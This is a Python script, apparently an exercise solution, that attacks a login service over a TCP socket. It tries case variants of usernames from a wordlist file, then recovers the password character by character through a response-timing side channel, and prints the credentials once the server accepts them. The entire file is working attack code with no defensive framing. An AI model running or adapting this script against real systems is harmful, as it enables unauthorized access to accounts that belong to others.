import argparse
import socket
import itertools
import time

import graycode
import math
import json

parser = argparse.ArgumentParser()
parser.add_argument("ip")
parser.add_argument("port")
args = parser.parse_args()

chars = list(map(lambda x: chr(x), range(ord('a'), ord('z') + 1)))
nums = list(map(lambda x: chr(x), range(ord('0'), ord('9') + 1)))
big_chars = list(map(lambda x: chr(x), range(ord('A'), ord('Z') + 1)))
alfanum = chars + nums
big_alfanum = chars + nums + big_chars


def password_gen():
    for num in range(1, len(alfanum) + 1):
        for password in itertools.combinations(alfanum, num):
            password = ''.join(letter for letter in password)
            yield password


def upper_lower(password, i):
    if password[i].isalpha() and password[i].islower():
        password = password[:i] + password[i].upper() + password[i + 1:]
    elif password[i].isalpha() and password[i].isupper():
        password = password[:i] + password[i].lower() + password[i + 1:]
    return password


def up_low_gen(password):
    n = 2 ** len(password)
    new_gray = 0
    for i in range(n):
        old_gray = graycode.tc_to_gray_code(i)
        dif = (old_gray ^ new_gray)
        if dif:
            d = int(math.log2(dif))
            password = upper_lower(password, d)
        new_gray = old_gray
        yield password


with socket.socket() as client_socket, open("logins.txt", "r") as my_file:
    address = (args.ip, int(args.port))
    client_socket.connect(address)
    send_dic = {"login": "", "password": ""}
    rec_dic = {}
    for login_guess in my_file:
        login_guess = login_guess.strip('\r\n')
        for modified_login in up_low_gen(login_guess):
            send_dic["login"] = modified_login
            send_json = json.dumps(send_dic)
            client_socket.send(send_json.encode())
            start = time.perf_counter()
            rec_json = client_socket.recv(1024).decode()
            end = time.perf_counter()
            rec_dic = json.loads(rec_json)
            if rec_dic["result"] == 'Wrong password!':
                password_guess = [""]
                while True:
                    for c in big_alfanum:
                        password_guess[-1] = c
                        send_dic["password"] = "".join(password_guess)
                        send_json = json.dumps(send_dic)
                        client_socket.send(send_json.encode())
                        start = time.perf_counter()
                        rec_json = client_socket.recv(1024).decode()
                        end = time.perf_counter()
                        rec_dic = json.loads(rec_json)
                        if end - start > 0.09:
                            password_guess.append("")
                            continue
                        elif rec_dic["result"] == "Connection success!":
                            print(send_json)
                            client_socket.close()
                            my_file.close()
                            quit()
